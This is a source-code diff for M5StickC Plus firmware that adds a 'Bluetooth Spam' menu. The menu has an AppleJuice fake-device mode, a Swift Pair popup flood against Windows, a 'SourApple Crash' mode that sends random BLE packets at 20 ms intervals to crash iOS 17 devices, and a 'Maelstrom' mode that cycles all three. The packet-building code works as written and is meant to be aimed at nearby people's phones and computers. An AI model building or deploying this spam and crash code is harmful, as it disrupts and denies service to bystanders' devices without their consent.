@@ -42,6 +42,8 @@ int brightness = 100;
 int ajDelay = 1000;
 bool rstOverride = false; // Reset Button Override. Set to true when navigating menus.
 bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
+bool swiftPair = false;   // Internal flag to place AppleJuice into Swift Pair random packet Mode
+bool maelstrom = false;   // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
 #define EEPROM_SIZE 4
 
 struct MENU {
@@ -67,6 +69,8 @@ struct MENU {
 // 13 - TV-B-Gone Region Setting
 // 14 - Wifi scanning
 // 15 - Wifi scan results
+// 16 - Bluetooth Spam Menu
+// 17 - Bluetooth Maelstrom
 
 bool isSwitching = true;
 int current_proc = 0; // Start in Clock Mode
@@ -119,8 +123,8 @@ void check_axp_press() {
 /// MAIN MENU ///
 MENU mmenu[] = {
   { "Clock", 0},
-  { "TV B-GONE", 13}, // We jump to the region menu first
-  { "AppleJuice", 8},
+  { "TV-B-Gone", 13}, // We jump to the region menu first
+  { "Bluetooth Spam", 16},
   { "WiFi Spam", 12},
   { "WiFi Scan", 14},
   { "Settings", 2},
@@ -612,10 +616,97 @@ void timeset_loop() {
   current_proc = 0;
 }
 
-/// AppleJuice ///
+/// Bluetooth Spamming ///
+/// BTSPAM MENU ///
+MENU btmenu[] = {
+  { "AppleJuice", 0},
+  { "Swift Pair", 1},
+  { "SourApple Crash", 2},
+  { "BT Maelstrom", 3},
+  { "Back", 4}
+};
+
+void btmenu_drawmenu() {
+  M5.Lcd.setTextSize(SMALL_TEXT);
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setCursor(0, 8, 1);
+  for ( int i = 0 ; i < ( sizeof(btmenu) / sizeof(MENU) ) ; i++ ) {
+    M5.Lcd.print((cursor == i) ? ">" : " ");
+    M5.Lcd.println(btmenu[i].name);
+  }
+}
+
+void btmenu_setup() {
+  M5.Lcd.setRotation(rotation);
+  cursor = 0;
+  sourApple = false;
+  swiftPair = false;
+  maelstrom = false;
+  rstOverride = true;
+  btmenu_drawmenu();
+  delay(250); // Prevent switching after menu loads up
+}
+
+void btmenu_loop() {
+  if (digitalRead(M5_BUTTON_RST) == LOW) {
+    cursor++;
+    cursor = cursor % ( sizeof(btmenu) / sizeof(MENU) );
+    btmenu_drawmenu();
+    delay(250);
+  }
+  if (digitalRead(M5_BUTTON_HOME) == LOW) {
+    int option = btmenu[cursor].command;
+    M5.Lcd.setRotation(rotation);
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setTextSize(MEDIUM_TEXT);
+    M5.Lcd.setCursor(5, 1);
+    M5.Lcd.println("BT Spam");
+    M5.Lcd.setTextSize(SMALL_TEXT);
+    M5.Lcd.print("Advertising:\n");
+
+    switch(option) {
+      case 0:
+        M5.Lcd.fillScreen(BLACK);
+        rstOverride = false;
+        isSwitching = true;
+        current_proc = 8;
+        break;
+      case 1:
+        swiftPair = true;
+        current_proc = 9; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        M5.Lcd.print("Swift Pair Random");
+        M5.Lcd.print("\n\nSide Key: Exit");
+        break;
+      case 2:
+        sourApple = true;
+        current_proc = 9; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        M5.Lcd.print("SourApple Crash");
+        M5.Lcd.print("\n\nSide Key: Exit");
+        break;
+      case 3:
+        rstOverride = false;
+        isSwitching = true;
+        current_proc = 17; // Maelstrom
+        M5.Lcd.print("Bluetooth Maelstrom\n");
+        M5.Lcd.print(" Combined BT Spam");
+        M5.Lcd.print("\n\nSide Key: Exit");
+        break;
+      case 4:
+        M5.Lcd.fillScreen(BLACK);
+        rstOverride = false;
+        isSwitching = true;
+        current_proc = 1;
+        break;
+    }
+  }
+}
+
 MENU ajmenu[] = {
   { "AirPods", 1},
-  { "SourApple Crash", 29},
   { "Transfer Number", 27},
   { "AirPods Pro", 2},
   { "AirPods Max", 3},
@@ -643,7 +734,7 @@ MENU ajmenu[] = {
   { "AppleTV Network", 25},
   { "TV Color Balance", 26},
   { "Setup New Phone", 28},
-  { "Back", 30},
+  { "Back", 29},
 };
 
 void aj_drawmenu() {
@@ -674,21 +765,26 @@ void aj_setup(){
   delay(1000);  
   cursor = 0;
   sourApple = false;
+  swiftPair = false;
+  maelstrom = false;
   rstOverride = true;
   aj_drawmenu();
 }
 
 void aj_loop(){
-  if (digitalRead(M5_BUTTON_RST) == LOW) {
-    cursor++;
-    cursor = cursor % ( sizeof(ajmenu) / sizeof(MENU) );
-    aj_drawmenu();
-    delay(100);
+  if (!maelstrom){
+    if (digitalRead(M5_BUTTON_RST) == LOW) {
+      cursor++;
+      cursor = cursor % ( sizeof(ajmenu) / sizeof(MENU) );
+      aj_drawmenu();
+      delay(100);
+    }
   }
-  if (digitalRead(M5_BUTTON_HOME) == LOW) {
+  if (digitalRead(M5_BUTTON_HOME) == LOW || maelstrom) {
     deviceType = ajmenu[cursor].command;
-    // Also borrowed heavily from ronaldstoner / ECTO-1A esp32 AppleJuice
-    //uint8_t* data;
+    if (maelstrom) {
+      deviceType = random(1, 28);
+    }
     switch(deviceType) {
       case 1:
         data = Airpods;
@@ -775,9 +871,6 @@ void aj_loop(){
         data = SetupNewPhone;
         break;
       case 29:
-        sourApple = true;
-        break;
-      case 30:
         rstOverride = false;
         isSwitching = true;
         current_proc = 1;
@@ -808,7 +901,7 @@ void aj_adv(){
   // Isolating this to its own process lets us take advantage 
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
-  if (sourApple){
+  if (sourApple || swiftPair || maelstrom){
     delay(20);   // 20msec delay instead of ajDelay for SourApple attack
     advtime = 0; // bypass ajDelay counter
   }
@@ -818,6 +911,7 @@ void aj_adv(){
                           // It allows the BLE beacon to run through the loop.
     BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
     if (sourApple){
+      Serial.print("SourApple Advertisement: ");
       // Some code borrowed from RapierXbox/ESP32-Sour-Apple
       // Original credits for algorithm ECTO-1A & WillyJL
       uint8_t packet[17];
@@ -839,13 +933,48 @@ void aj_adv(){
       packet[i++] =  0x10;  // Type ???
       esp_fill_random(&packet[i], 3);
       oAdvertisementData.addData(std::string((char *)packet, 17));
+      for (int i = 0; i < sizeof packet; i ++) {
+        Serial.printf("%02x", packet[i]);
+      }
+      Serial.println("");
+
+    } else if (swiftPair) {
+      const char* display_name = generateRandomName();
+      Serial.printf("SwiftPair Advertisement: '%s' - ", display_name);
+      uint8_t display_name_len = strlen(display_name);
+      uint8_t size = 7 + display_name_len;
+      uint8_t* packet = (uint8_t*)malloc(size);
+      uint8_t i = 0;
+      packet[i++] = size - 1; // Size
+      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+      packet[i++] = 0x06; // Company ID (Microsoft)
+      packet[i++] = 0x00; // ...
+      packet[i++] = 0x03; // Microsoft Beacon ID
+      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
+      packet[i++] = 0x80; // Reserved RSSI Byte
+      for (int j = 0; j < display_name_len; j++) {
+        packet[i + j] = display_name[j];
+      }
+      for (int i = 0; i < size; i ++) {
+        Serial.printf("%02x", packet[i]);
+      }
+      Serial.println("");
+
+      i += display_name_len;  
+      oAdvertisementData.addData(std::string((char *)packet, size));
     } else {
+      Serial.printf("AppleJuice Advertisement: ", deviceType);
       if (deviceType >= 18){
         oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
       } else {
         oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
       }
+      for (int i = 0; i < sizeof(Airpods); i ++) {
+        Serial.printf("%02x", data[i]);
+      }      
+      Serial.println("");
     }
+    
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->start();
     digitalWrite(M5_LED, LOW); //LED ON on Stick C Plus
@@ -853,10 +982,17 @@ void aj_adv(){
     digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
   }
   if (digitalRead(M5_BUTTON_RST) == LOW) {
-    current_proc = 8;
+    if (sourApple || swiftPair){
+      current_proc = 16;
+      btmenu_drawmenu();
+    } else {
+      current_proc = 8;      
+      aj_drawmenu();
+    }
     sourApple = false;
+    swiftPair = false;
+    maelstrom = false;
     pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
-    aj_drawmenu();
     delay(250);
   }
 }
@@ -972,6 +1108,25 @@ void wifispam_loop() {
   }
 }
 
+void btmaelstrom_setup(){
+  rstOverride = false;
+  maelstrom = true;
+}
+
+void btmaelstrom_loop(){
+  swiftPair = false;
+  sourApple = true;
+  aj_adv();
+  swiftPair = true;
+  sourApple = false;
+  aj_adv();
+  swiftPair = false;
+  sourApple = false;
+  aj_loop(); // roll a random device ID
+  aj_adv();
+}
+
+
 /// WIFISPAM MENU ///
 MENU wsmenu[] = {
   { "Funny", 0},
@@ -1007,29 +1162,20 @@ void wsmenu_loop() {
   }
   if (digitalRead(M5_BUTTON_HOME) == LOW) {
     int option = wsmenu[cursor].command;
-    // Also borrowed heavily from ronaldstoner / ECTO-1A esp32 AppleJuice
+    rstOverride = false;
+    current_proc = 11;
+    isSwitching = true;
     switch(option) {
       case 0:
         spamtype = 1;
-        rstOverride = false;
-        isSwitching = true;
-        current_proc = 11;
         break;
       case 1:
         spamtype = 2;
-        rstOverride = false;
-        isSwitching = true;
-        current_proc = 11;
         break;
       case 2:
         spamtype = 3;
-        rstOverride = false;
-        isSwitching = true;
-        current_proc = 11;
         break;
       case 3:
-        rstOverride = false;
-        isSwitching = true;
         current_proc = 1;
         break;
     }
@@ -1130,7 +1276,6 @@ void wscan_result_loop(){
     M5.Lcd.printf("\nSide Key: Back");
   }
 }
-
 
 void wscan_setup(){
   rstOverride = false;  
@@ -1270,6 +1415,12 @@ void loop() {
       case 15:
         wscan_result_setup();
         break;
+      case 16:
+        btmenu_setup();
+        break;
+      case 17:
+        btmaelstrom_setup();
+        break;
     }
   }
 
@@ -1321,6 +1472,12 @@ void loop() {
       break;
     case 15:
       wscan_result_loop();
+      break;
+    case 16:
+      btmenu_loop();
+      break;
+    case 17:
+      btmaelstrom_loop();
       break;
   }
 }
